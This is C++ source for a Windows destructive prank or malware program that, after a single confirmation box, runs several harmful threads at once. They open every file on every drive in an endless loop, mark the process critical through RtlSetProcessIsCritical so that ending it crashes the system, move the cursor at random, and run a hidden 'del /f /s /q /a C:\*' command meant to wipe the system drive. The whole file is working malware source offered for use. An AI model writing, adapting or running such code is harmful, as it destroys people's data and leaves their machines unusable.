#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#include <windows.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <filesystem>
#include <string>
namespace fs = std::filesystem;


#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

DWORD WINAPI OpenRandomFile(LPVOID lpParam) {
    while (TRUE) {
        for (int drive = 'A'; drive <= 'Z'; ++drive) {
            wchar_t root_path[] = { (wchar_t)drive, L':', L'\\', L'\0' };

            UINT driveType = GetDriveTypeW(root_path);
            if (driveType <= 1 || driveType == DRIVE_NO_ROOT_DIR) {
                continue;
            }

            try {
                for (const auto& entry : fs::recursive_directory_iterator(root_path, fs::directory_options::skip_permission_denied)) {
                    if (entry.is_regular_file()) {
                        std::wstring filePath = entry.path().wstring();
                        ShellExecuteW(NULL, L"open", filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
                        Sleep(500);
                    }
                }
            }
            catch (...) {
                continue;
            }
        }
        Sleep(5000);
    }
    return 0;
}
extern "C" NTSTATUS NTAPI RtlSetProcessIsCritical(
    BOOLEAN bNewStatus,
    PBOOLEAN pbOldStatus,
    BOOLEAN bNeedPrivilege
);

DWORD WINAPI SetCriticalProcess(LPVOID lpParam) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        CloseHandle(hToken);
    }

    typedef NTSTATUS(NTAPI* pfnRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pfnRtlSetProcessIsCritical RtlSetProcessIsCritical =
            (pfnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
        if (RtlSetProcessIsCritical) {
            BOOLEAN bOld = FALSE;
            RtlSetProcessIsCritical(TRUE, &bOld, FALSE);
        }
    }

    return 0;
}

DWORD WINAPI TeleportCursor(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    while (TRUE) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        SetCursorPos(x, y);
        Sleep(1000);
    }
    return 0;
}
DWORD WINAPI CmdCommand(LPVOID lpParam) {
    wchar_t commandline[] = L"cmd.exe del /f /s /q /a C:\*";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessW(NULL, commandline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxW(NULL, L"Are you sure to delete operating system?", L"Delete system?", MB_YESNO | MB_ICONWARNING | MB_TOPMOST) != IDYES) return 0;
    Sleep(500);

    CreateThread(NULL, 0, OpenRandomFile, NULL, 0, NULL);
    HANDLE hSnd1 = CreateThread(NULL, 0, SetCriticalProcess, NULL, 0, NULL);
    CreateThread(NULL, 0, TeleportCursor, NULL, 0, NULL);
    CreateThread(NULL, 0, CmdCommand, NULL, 0, NULL);

    Sleep(-1); return 0;
}
